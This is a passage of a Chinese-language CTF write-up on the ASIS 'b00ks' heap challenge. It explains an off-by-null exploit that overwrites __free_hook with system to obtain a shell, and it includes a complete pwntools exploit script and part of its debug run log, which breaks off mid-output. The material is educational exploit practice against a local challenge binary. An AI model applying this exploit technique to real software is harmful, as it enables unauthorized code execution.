<p>payload2 = p64(binsh) + p64(free_hook)说明：<br>payload 调用了 edit 函数，这里修改的实际是 book2 的 name 以及 description 项<del><strong>实际上是再次修改 fake_book 的 name 以及 description 项</strong></del>为/bin/sh 地址和 free_hook 的地址。<br><del>（因为已经泄露出 book2 的地址了，这里原 fake_book 的内容已经没有利用价值了）</del><br>payload3 = p64(system)<br>修改 book2 的 description 项为 system 函数地址(这里实际修改的是 __free_hook 的地址)。</p>
</blockquote>
<p><strong>最后再 free book2</strong> ，在 free description 时，实际调用的则是 system(“/bin/sh”)，得到 shell。<br>大概的流程就是：<strong>信息泄露–伪造结构–信息泄露–改写函数–取得 shell</strong></p>
<h1 id="exp-内容及执行详情"><a href="#exp-内容及执行详情" class="headerlink" title="exp 内容及执行详情"></a>exp 内容及执行详情</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_len, name, desc_len, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter new book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Loading program...&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Load success!&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Off-BY-NULL!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="string">&quot;book1_name&quot;</span>, <span class="number">200</span>, <span class="string">&quot;book1_desc&quot;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&quot;book2_name&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;book2_desc&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Leaking book_1&#x27;s address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Book1_addr : 0x%x&quot;</span> % book1_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating book_2&#x27;s address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;Book2_addr : 0x%x&quot;</span> % book2_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Prepare to construct a fake book...&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">8</span>) + p64(book2_addr + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Fake book constructed! And two pointers were set to book2.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Off-BY-NULL again! Now Book1 was set to the fake book.&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Leaking mmap address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Mmap address : 0x%x&quot;</span> % mmap_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating libc&#x27;s base&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = <span class="number">0x7ffff79e4000</span>   <span class="comment"># Change it if doesn&#x27;t work!</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Libc&#x27;s addr : 0x%x&quot;</span> % libc_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Searching __free_hook &amp; system &amp; /bin/sh in libc...&quot;</span>)</span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>] + libc_addr</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>] + libc_addr</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_addr</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;__free_hook address: 0x%x&quot;</span> % free_hook)</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system)</span><br><span class="line">log.success(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % binsh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Changing book2&#x27;s pointers...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload2 = p64(binsh) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Book2&#x27;s name and description&#x27;s pointer has been changed!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s name --&gt; /bin/sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s desc --&gt; free_hook&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Prepare to change book2&#x27;s description, also known as __free_hook.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload3 = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,payload3)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Now __free_hook&#x27;s address is system&#x27;s address!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;We just need to free book2.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.info(<span class="string">&quot;Ready in 3 seconds...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">log.success(<span class="string">&quot;PWN!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop<span class="variable">$</span> python end.py</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x21020 realloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x21060 __tls_get_addr</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x210a0 memalign</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x210b0 _dl_exception_create</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x210f0 __tunable_get_val</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x211a0 _dl_find_dso_for_object</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x211e0 calloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x212c0 malloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x212c8 free</span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="literal">-64</span><span class="literal">-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Loading program...</span><br><span class="line">[+] Starting local <span class="keyword">process</span> <span class="string">&#x27;./b00ks&#x27;</span> argv=[<span class="string">&#x27;./b00ks&#x27;</span>] : pid <span class="number">7118</span></span><br><span class="line">[+] Load success!</span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x33 bytes:</span><br><span class="line">    <span class="string">&#x27;Welcome to ASISCTF book library\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter author name: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x21 bytes:</span><br><span class="line">    <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line">[*] Off<span class="literal">-BY</span><span class="literal">-NULL</span>!</span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x6f bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x17 bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter book name size: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x3 bytes:</span><br><span class="line">    <span class="string">&#x27;10\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x20 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>xb bytes:</span><br><span class="line">    <span class="string">&#x27;book1_name\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x1e bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter book description size: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x4 bytes:</span><br><span class="line">    <span class="string">&#x27;200\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x18 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter book description: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>xb bytes:</span><br><span class="line">    <span class="string">&#x27;book1_desc\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x86 bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; \n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter book name size: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x7 bytes:</span><br><span class="line">    <span class="string">&#x27;135168\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x20 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>xb bytes:</span><br><span class="line">    <span class="string">&#x27;book2_name\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x1e bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter book description size: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x7 bytes:</span><br><span class="line">    <span class="string">&#x27;135168\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x18 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter book description: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>xb bytes:</span><br><span class="line">    <span class="string">&#x27;book2_desc\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x6f bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">[*] Leaking book_1<span class="string">&#x27;s address...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">4</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x12b bytes:</span></span><br><span class="line"><span class="string">    00000000  49 44 3a 20  31 0a 4e 61  6d 65 3a 20  62 6f 6f 6b  │ID: │1·Na│me: │book│</span></span><br><span class="line"><span class="string">    00000010  31 5f 6e 61  6d 65 0a 44  65 73 63 72  69 70 74 69  │1_na│me·D│escr│ipti│</span></span><br><span class="line"><span class="string">    00000020  6f 6e 3a 20  62 6f 6f 6b  31 5f 64 65  73 63 0a 41  │on: │book│1_de│sc·A│</span></span><br><span class="line"><span class="string">    00000030  75 74 68 6f  72 3a 20 61  61 61 61 61  61 61 61 61  │utho│r: a│aaaa│aaaa│</span></span><br><span class="line"><span class="string">    00000040  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span></span><br><span class="line"><span class="string">    00000050  61 61 61 61  61 61 61 60  83 75 55 55  55 0a 49 44  │aaaa│aaa`│·uUU│U·ID│</span></span><br><span class="line"><span class="string">    00000060  3a 20 32 0a  4e 61 6d 65  3a 20 62 6f  6f 6b 32 5f  │: 2·│Name│: bo│ok2_│</span></span><br><span class="line"><span class="string">    00000070  6e 61 6d 65  0a 44 65 73  63 72 69 70  74 69 6f 6e  │name│·Des│crip│tion│</span></span><br><span class="line"><span class="string">    00000080  3a 20 62 6f  6f 6b 32 5f  64 65 73 63  0a 41 75 74  │: bo│ok2_│desc│·Aut│</span></span><br><span class="line"><span class="string">    00000090  68 6f 72 3a  20 61 61 61  61 61 61 61  61 61 61 61  │hor:│ aaa│aaaa│aaaa│</span></span><br><span class="line"><span class="string">    000000a0  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span></span><br><span class="line"><span class="string">    000000b0  61 61 61 61  61 60 83 75  55 55 55 0a  0a 31 2e 20  │aaaa│a`·u│UUU·│·1. │</span></span><br><span class="line"><span class="string">    000000c0  43 72 65 61  74 65 20 61  20 62 6f 6f  6b 0a 32 2e  │Crea│te a│ boo│k·2.│</span></span><br><span class="line"><span class="string">    000000d0  20 44 65 6c  65 74 65 20  61 20 62 6f  6f 6b 0a 33  │ Del│ete │a bo│ok·3│</span></span><br><span class="line"><span class="string">    000000e0  2e 20 45 64  69 74 20 61  20 62 6f 6f  6b 0a 34 2e  │. Ed│it a│ boo│k·4.│</span></span><br><span class="line"><span class="string">    000000f0  20 50 72 69  6e 74 20 62  6f 6f 6b 20  64 65 74 61  │ Pri│nt b│ook │deta│</span></span><br><span class="line"><span class="string">    00000100  69 6c 0a 35  2e 20 43 68  61 6e 67 65  20 63 75 72  │il·5│. Ch│ange│ cur│</span></span><br><span class="line"><span class="string">    00000110  72 65 6e 74  20 61 75 74  68 6f 72 20  6e 61 6d 65  │rent│ aut│hor │name│</span></span><br><span class="line"><span class="string">    00000120  0a 36 2e 20  45 78 69 74  0a 3e 20                  │·6. │Exit│·&gt; │</span></span><br><span class="line"><span class="string">    0000012b</span></span><br><span class="line"><span class="string">[+] Book1_addr : 0x555555758360</span></span><br><span class="line"><span class="string">[*] Calculating book_2&#x27;</span>s address...</span><br><span class="line">[+] Book2_addr : <span class="number">0</span>x555555758390</span><br><span class="line">[*] Prepare to construct a fake book...</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x24 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter the book id you want to edit: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x1c bytes:</span><br><span class="line">    <span class="string">&#x27;Enter new book description: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x91 bytes:</span><br><span 